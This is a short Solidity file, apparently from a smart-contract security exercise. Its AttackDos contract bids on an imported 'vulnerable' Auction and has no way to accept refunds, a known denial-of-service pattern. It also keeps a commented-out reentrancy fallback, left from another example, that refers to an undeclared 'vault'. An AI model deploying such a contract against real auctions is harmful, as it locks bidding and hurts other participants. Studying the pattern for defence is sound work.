// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.28;
import {Auction} from "./VulnerableContract.sol";

contract AttackDos {
    Auction public auction;

    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    // Fallback is called when Vault sends Ether to this contract.
    /*fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }*/

    function attack() external payable {
        auction.bid{value: msg.value}();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}